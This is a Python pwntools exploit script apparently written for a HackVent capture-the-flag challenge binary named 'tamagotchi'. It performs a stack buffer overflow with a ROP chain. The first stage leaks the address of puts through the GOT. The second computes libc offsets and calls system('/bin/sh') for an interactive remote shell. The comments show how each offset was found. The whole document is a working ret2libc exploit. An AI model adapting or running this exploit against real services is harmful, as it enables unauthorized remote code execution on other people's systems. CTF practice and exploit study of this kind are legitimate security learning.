#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from struct import *

offset     = 216        # offset to overflow to RIP           <-- gdb pattern_create + pattern_offset
pop_ret    = 0x400803   # ROP to inject RDI register          <-- ropper --file tamagotchi --search "% rdi"
main       = 0x4006ca   # address of main to jump back        <-- gdb tamagotchi -ex "p main"
puts_plt   = 0x4004b0   # puts@plt (procedure linkage table)  <-- gdb tamagotchi -ex "p puts"
puts_got   = 0x601018   # puts@got (global offset table)      <-- objdump -R tamagotchi | grep puts
puts_off   = 0x078460   # offset to puts() in libc            <-- readelf -s libc-2.26.so | grep puts
system_off = 0x047dc0   # offset to system() in libc          <-- readelf -s libc-2.26.so | grep system
bin_sh_off = 0x1a3ee0   # offset to "/bin/sh" in libc         <-- objdump -s libc-2.26.so | grep /bin/sh

r = remote("challenges.hackvent.hacking-lab.com", 31337)

# buffer to leak remote puts address
buf_leak = "A" * offset                 # padding to RIP's offset
buf_leak += pack("<Q", pop_ret)         # pop arg into RDI
buf_leak += pack("<Q", puts_got)        # arg: puts@got entry
buf_leak += pack("<Q", puts_plt)        # return to puts
buf_leak += pack("<Q", main)            # return to main

# stage 1: read the remote puts() address
r.recvuntil("[ch01c3]>")
r.sendline("1")                         # choose to eat
r.recvuntil("[f00d]>")
r.sendline(buf_leak)                    # send buffer to leak puts address
r.recvuntil("[ch01c3]>")
r.sendline("2")                         # choose to exit
r.recvuntil("[+] bye bye\n")

# stage 2: calculate remote addresses from known offsets
puts_addr = u64(r.recv(6) + "\x00" * 2) # read remote puts address
libc_base = puts_addr - puts_off        # calculate libc base address
system = libc_base + system_off         # calculate system address
bin_sh = libc_base + bin_sh_off         # calculate "/bin/sh" address

print("[+] libc base at: 0x%08x" % libc_base)
print("[+] system() at: 0x%08x" % system)
print("[+] /bin/sh at: 0x%08x" % bin_sh)

# buffer to get remote shell
buf_rce = "A" * offset                  # padding to RIP's offset
buf_rce += pack("<Q", pop_ret)          # pop arg into RDI
buf_rce += pack("<Q", bin_sh)           # arg: "/bin/sh"
buf_rce += pack("<Q", system)           # return to system

# stage 3: pwn
r.recvuntil("[ch01c3]>")
r.sendline("1")                         # choose to eat
r.recvuntil("[f00d]>")
r.sendline(buf_rce)                     # send buffer to get remote shell
r.recvuntil("[ch01c3]>")
r.sendline("2")                         # choose to exit
r.recvuntil("[+] bye bye\n")

r.interactive()                         # switch to interactive mode to use shell
